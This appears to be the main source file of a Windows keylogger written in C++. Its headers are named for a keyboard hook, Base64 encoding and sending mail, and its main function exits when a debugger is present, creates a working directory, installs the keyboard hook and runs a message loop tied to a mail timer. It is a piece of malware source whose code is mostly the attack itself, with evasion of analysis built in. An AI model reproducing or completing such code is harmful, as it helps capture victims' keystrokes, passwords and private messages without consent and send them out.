#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"


//using namespace std;

int main()
{

    if (IsDebuggerPresent())
    {
        printf("[+] Debugger Detected !");
        return 1;
    }
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();

    while(GetMessage(&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    MailTimer.Stop();
    return 0;
}
